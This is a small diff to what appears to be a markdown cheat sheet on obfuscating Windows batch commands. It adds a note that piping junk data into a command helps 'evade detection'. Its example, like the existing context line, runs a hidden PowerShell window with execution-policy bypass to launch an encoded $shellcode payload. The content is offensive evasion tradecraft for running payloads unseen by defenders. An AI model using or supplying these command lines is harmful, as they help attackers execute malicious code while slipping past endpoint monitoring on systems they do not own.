@@ -40,6 +40,10 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
       @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
+- We can also **pipe** commands to evade detection
+
+      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
 ---
 
 - String command to obfuscate<br />
